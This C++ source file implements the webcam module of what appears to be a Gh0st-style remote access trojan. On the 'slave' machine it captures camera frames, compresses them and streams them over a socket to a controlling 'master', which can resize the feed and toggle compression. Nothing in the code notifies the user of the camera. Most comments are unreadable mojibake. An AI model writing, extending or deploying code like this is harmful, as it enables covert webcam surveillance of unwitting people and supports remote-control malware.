// VideoManager.cpp: implementation of the CVideoManager class.
//
//////////////////////////////////////////////////////////////////////

#include "VideoManager.h"

// Slave -> Master: no video capture device (webcam) available.
// Must stay outside the existing token range (0x64..0x7E).
#ifndef TOKEN_WEBCAM_NODEVICE
#define TOKEN_WEBCAM_NODEVICE 0xE0
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CVideoManager::CVideoManager(CClientSocket *pClient) : CManager(pClient)
{
 	m_pVideoCap = NULL;
	m_pVideoCodec = NULL;
 	m_bIsWorking = true;
	m_bIsCompress = true;
	m_nVedioWidth = 0;
	m_nVedioHeight = 0;
	m_fccHandler = 0;
 	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}

CVideoManager::~CVideoManager()
{
	InterlockedExchange((LPLONG)&m_bIsWorking, false);
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
}

void CVideoManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_NEXT:
		NotifyDialogIsOpen();
		break;
	case COMMAND_WEBCAM_ENABLECOMPRESS: // Òªï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ñ¹ï¿½ï¿½
		{
			// ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ñ¹ï¿½ï¿½ï¿½ï¿½ï¿½ï¿?
			if (m_pVideoCodec)
				InterlockedExchange((LPLONG)&m_bIsCompress, true);
		}
		break;
	case COMMAND_WEBCAM_DISABLECOMPRESS:
		InterlockedExchange((LPLONG)&m_bIsCompress, false);
		break;
	case COMMAND_WEBCAM_RESIZE:
		ResetScreen(*((LPDWORD)(lpBuffer + 1)), *((LPDWORD)(lpBuffer + 5)));
		break;
	default:	
		break;
	}	
}

void CVideoManager::sendBITMAPINFO()
{
	DWORD	dwBytesLength = 1 + sizeof(BITMAPINFO);
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_WEBCAM_BITMAPINFO;
	memcpy(lpBuffer + 1, m_pVideoCap->m_lpbmi, sizeof(BITMAPINFO));
	Send(lpBuffer, dwBytesLength);

	delete [] lpBuffer;		
}

void CVideoManager::sendNextScreen()
{
	LPVOID	lpDIB = m_pVideoCap->GetDIB();
	// token + IsCompress + m_fccHandler + DIB
	int		nHeadLen = 1 + 1 + 4;

	UINT	nBufferLen = nHeadLen + m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage;
	LPBYTE	lpBuffer = new BYTE[nBufferLen];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_WEBCAM_DIB;
	lpBuffer[1] = m_bIsCompress;
	memcpy(lpBuffer + 2, &m_fccHandler, sizeof(DWORD));

	UINT	nPacketLen = 0;
	if (m_bIsCompress && m_pVideoCodec)
	{
		int	nCompressLen = 0;
		bool bRet = m_pVideoCodec->EncodeVideoData((LPBYTE)lpDIB, 
			m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage, lpBuffer + nHeadLen, &nCompressLen, NULL);
		if (!nCompressLen)
		{
			// some thing ...
			return;
		}
		nPacketLen = nCompressLen + nHeadLen;
	}
	else
	{
		memcpy(lpBuffer + nHeadLen, lpDIB, m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage);
		nPacketLen = m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage + nHeadLen;
	}

	Send(lpBuffer, nPacketLen);

	delete [] lpBuffer;
}

void CVideoManager::ResetScreen(int nWidth, int nHeight)
{
	InterlockedExchange((LPLONG)&m_bIsWorking, false);
	WaitForSingleObject(m_hWorkThread, INFINITE);

	// ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Æµï¿½ï¿½Ð¡
	m_nVedioWidth = nWidth;
	m_nVedioHeight = nHeight;

	InterlockedExchange((LPLONG)&m_bIsWorking, true);
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}

DWORD WINAPI CVideoManager::WorkThread( LPVOID lparam )
{
	static DWORD dwLastScreen = GetTickCount();

	CVideoManager *pThis = (CVideoManager *)lparam;
	
	if (!pThis->Initialize())
	{
		// No webcam / capture init failed: notify the master so it can show a
		// friendly prompt instead of the slave silently dropping this connection.
		BYTE bNoDevice = TOKEN_WEBCAM_NODEVICE;
		pThis->Send(&bNoDevice, sizeof(bNoDevice));
		// µÈ´ýÐ¡°ü·¢³ö£¬±ÜÃâ½ô½Ó×ÅµÄ abortive ¹Ø±Õ(SO_LINGER=0 -> RST)°Ñ NODEVICE ¶ªµô
		Sleep(150);

		pThis->Destroy();
		pThis->m_pClient->Disconnect();
		return -1;
	}
	pThis->sendBITMAPINFO();
	// ï¿½È¿ï¿½ï¿½Æ¶Ë¶Ô»ï¿½ï¿½ï¿½ï¿?
	pThis->WaitForDialogOpen();

	while (pThis->m_bIsWorking)
	{
		// ï¿½ï¿½ï¿½ï¿½ï¿½Ù¶ï¿½
 		if ((GetTickCount() - dwLastScreen) < 150)
 			Sleep(100);
 		dwLastScreen = GetTickCount();
		pThis->sendNextScreen();
	}
	// ï¿½ï¿½ï¿½ï¿½ï¿½Ñ¾ï¿½ï¿½ï¿½ï¿½ï¿½Êµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Âµï¿½ï¿½ï¿½
	pThis->Destroy();

	return 0;
}

bool CVideoManager::Initialize()
{
	bool	bRet = false;
	// ï¿½ï¿½ï¿½ï¿½Ê¹ï¿½ï¿½ï¿½ï¿½
	if (!CVideoCap::IsWebCam())
		return false;

	m_pVideoCap = new CVideoCap;

	// Ö¸ï¿½ï¿½ï¿½Ë¹Ì¶ï¿½ï¿½ï¿½Ð¡
	if (m_nVedioWidth && m_nVedioHeight)
	{
		bRet = m_pVideoCap->Initialize(m_nVedioWidth, m_nVedioHeight);
	}
	else
	{
		// ï¿½ï¿½ï¿½ï¿½H263ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö§ï¿½Öµï¿½ï¿½ï¿½ï¿½Ö´ï¿½Ð¡,ï¿½ï¿½ï¿½È¿ï¿½ï¿½ï¿½
		bRet = m_pVideoCap->Initialize(352, 288);
		if (!bRet)
			bRet = m_pVideoCap->Initialize(176, 144);

		// ï¿½ï¿½ï¿½ï¿½ÏµÍ³Ä¬ï¿½Ïµï¿½
		if (!bRet)
			bRet = m_pVideoCap->Initialize();

	}

	// ï¿½ï¿½Òªï¿½ï¿½Ñ¹ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½CVideoCapï¿½ï¿½Ê¼ï¿½ï¿½Ê§ï¿½ï¿½
	if (!bRet)
		return bRet;

	// ï¿½ï¿½ï¿½â¼¸ï¿½Ö½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ñ¡Ò»ï¿½ï¿?
	DWORD	fccHandlerArray[] = 
	{
		859189837,	// Microsoft H.263 Video Codec
		842225225,	// Intel Indeo(R) Video R3.2
		842289229,	// Microsoft MPEG-4 Video Codec V2
		1684633187	// Cinepak Codec by Radius
	};

	for (int i = 0; i < sizeof(fccHandlerArray) / sizeof(fccHandlerArray[0]); i++)
	{
		m_pVideoCodec = new CVideoCodec;
		if (!m_pVideoCodec->InitCompressor(m_pVideoCap->m_lpbmi, fccHandlerArray[i]))
		{
			delete m_pVideoCodec;
			// ï¿½ï¿½NULL, ï¿½ï¿½ï¿½ï¿½Ê±ï¿½Ð¶ï¿½ï¿½Ç·ï¿½ÎªNULLï¿½ï¿½ï¿½Ð¶ï¿½ï¿½Ç·ï¿½Ñ¹ï¿½ï¿½
			m_pVideoCodec = NULL;
		}
		else
		{
			m_fccHandler = fccHandlerArray[i];
			break;
		}
	}
	return bRet;
}

void CVideoManager::Destroy()
{
	if (m_pVideoCap)
	{
		delete m_pVideoCap;
		m_pVideoCap = NULL;
	}
	if (m_pVideoCodec)
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;
	}
}
